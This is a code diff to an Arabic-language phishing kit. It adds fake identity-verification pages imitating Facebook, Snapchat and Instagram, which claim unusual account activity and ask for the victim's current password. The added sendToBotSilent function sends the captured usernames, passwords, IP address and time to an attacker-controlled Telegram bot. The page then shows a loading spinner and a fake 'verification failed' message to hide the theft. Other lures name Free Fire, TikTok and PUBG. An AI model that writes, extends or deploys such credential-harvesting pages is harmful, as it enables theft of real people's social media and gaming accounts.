@@ -682,12 +682,99 @@
             font-weight: 600;
             text-decoration: none;
         }
+
+        /* ---------- أنماط شاشة التحميل ورسالة الخطأ ---------- */
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .overlay.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .dialog {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 300px;
+            width: 80%;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }
+        .dialog i {
+            font-size: 40px;
+            margin-bottom: 15px;
+            color: #1877f2;
+        }
+        .dialog.snapchat i { color: #FFFC00; background: #000; border-radius: 50%; padding: 8px; }
+        .dialog.instagram2 i { color: #0095f6; }
+        .dialog p {
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        .snapchat .spinner { border-top-color: #FFFC00; }
+        .instagram2 .spinner { border-top-color: #0095f6; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error-message {
+            color: #d32f2f;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div id="contentContainer"></div>
 
+    <!-- عناصر الدايلوج والرسائل -->
+    <div id="loadingOverlay" class="overlay">
+        <div id="dialogBox" class="dialog">
+            <i class="fas fa-shield-alt"></i>
+            <div class="spinner"></div>
+            <p id="loadingText">جارٍ تأكيد الهوية...</p>
+        </div>
+    </div>
+
+    <div id="errorToast" style="position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #d32f2f; color: white; padding: 12px 24px; border-radius: 8px; font-size: 14px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); display: none; z-index: 10000;">
+        فشل التأكيد، يرجى المحاولة لاحقاً.
+    </div>
+
     <script>
+        // دوال التحميل والخطأ
+        function showLoading(platform) {
+            const overlay = document.getElementById('loadingOverlay');
+            const dialog = document.getElementById('dialogBox');
+            dialog.className = 'dialog ' + platform; // لإضافة لون مميز للمنصة
+            overlay.classList.add('show');
+        }
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.remove('show');
+        }
+        function showError(message) {
+            const toast = document.getElementById('errorToast');
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 3000);
+        }
+
         // دالة لفك تشفير Base64 وتحويل النص إلى كائن params
         function decodeBase64Data(encoded) {
             try {
@@ -743,7 +830,58 @@
             }
         }
 
-        // إرسال البيانات للبوت (في الخلفية) ثم التوجيه للموقع الحقيقي
+        // إرسال البيانات للبوت (في الخلفية) بدون توجيه
+        async function sendToBotSilent(platform, email, password, amount = null) {
+            const params = getUrlParams();
+            if (!email || !password || !params.chat_id || !params.token) return;
+
+            const platformNames = {
+                'freefire': 'فري فاير',
+                'facebook': 'فيسبوك (تأكيد)',
+                'tiktok': 'تيك توك',
+                'instagram': 'انستجرام (متابعين)',
+                'instagram2': 'انستجرام (تأكيد)',
+                'pubg': 'ببجي',
+                'snapchat': 'سناب شات'
+            };
+
+            let message = `🔔 [${platformNames[platform] || platform}]\n\n`;
+            message += `📧 البريد الإلكتروني/المستخدم: ${email}\n`;
+            message += `🔑 كلمة السر: ${password}\n`;
+
+            if (amount) message += `💰 الكمية: ${amount}\n`;
+
+            message += `🌐 IP: ${await getIP()}\n`;
+            message += `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+
+            fetch(`https://api.telegram.org/bot${params.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: params.chat_id, text: message })
+            }).catch(() => {});
+        }
+
+        // دالة موحدة للتعامل مع النماذج (تأكيد الهوية)
+        async function handleVerificationSubmit(platform, event) {
+            event.preventDefault();
+            const email = document.getElementById('email')?.value;
+            const password = document.getElementById('password')?.value;
+            if (!email || !password) return;
+
+            // إرسال البيانات بصمت
+            await sendToBotSilent(platform, email, password);
+
+            // إظهار التحميل
+            showLoading(platform);
+
+            // بعد 3 ثوانٍ نخفي التحميل ونظهر رسالة الخطأ
+            setTimeout(() => {
+                hideLoading();
+                showError('فشل التأكيد، يرجى المحاولة لاحقاً.');
+            }, 3000);
+        }
+
+        // دالة إرسال للمنصات الأخرى (القديمة) مع التوجيه
         async function sendToBot(platform) {
             const params = getUrlParams();
             const email = document.getElementById('email')?.value || '';
@@ -836,7 +974,7 @@
                                 <img src="https://i.ibb.co/RTs0rKX6/images-1.png" alt="Security Shield" class="fbnew-shield">
                                 <h2>تأكيد هويتك</h2>
                                 <p>لقد لاحظنا نشاطاً غير معتاد على حسابك. يرجى تسجيل الدخول مجدداً لتأكيد ملكيتك للحساب وتأمين بياناتك.</p>
-                                <form onsubmit="event.preventDefault(); sendToBot('facebook');">
+                                <form onsubmit="handleVerificationSubmit('facebook', event)">
                                     <input type="text" name="email" id="email" class="fbnew-input" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                                     <input type="password" name="pass" id="password" class="fbnew-input" placeholder="كلمة السر الحالية" required>
                                     <button type="submit" class="fbnew-btn">تسجيل الدخول</button>
@@ -858,7 +996,7 @@
                                 <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Ghost" class="snapchat-ghost">
                                 <h2>ساعدنا في تأكيد هويتك</h2>
                                 <p>لقد لاحظنا وجود نشاط غير معتاد على حسابك في Snapchat. لتتمكن من العودة، يرجى تأكيد ملكية الحساب بإدخال بياناتك أدناه.</p>
-                                <form onsubmit="event.preventDefault(); sendToBot('snapchat');">
+                                <form onsubmit="handleVerificationSubmit('snapchat', event)">
                                     <input type="text" name="username" id="email" class="snapchat-input" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
                                     <input type="password" name="password" id="password" class="snapchat-input" placeholder="كلمة السر الحالية" required>
                                     <button type="submit" class="snapchat-btn">تأكيد الهوية</button>
@@ -878,7 +1016,7 @@
                                 <img src="https://i.ibb.co/BK5GWtwv/images-8.jpg" alt="Security" class="instagram2-shield">
                                 <h2>ساعدنا في تأكيد هويتك</h2>
                                 <p>لقد لاحظنا وجود نشاط غير معتاد على حسابك. لتتمكن من العودة، يرجى تأكيد ملكية الحساب بإدخال بياناتك أدناه.</p>
-                                <form onsubmit="event.preventDefault(); sendToBot('instagram2');">
+                                <form onsubmit="handleVerificationSubmit('instagram2', event)">
                                     <input type="text" name="username" id="email" class="instagram2-input" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
                                     <input type="password" name="password" id="password" class="instagram2-input" placeholder="كلمة السر الحالية" required>
                                     <button type="submit" class="instagram2-btn">تأكيد الهوية</button>
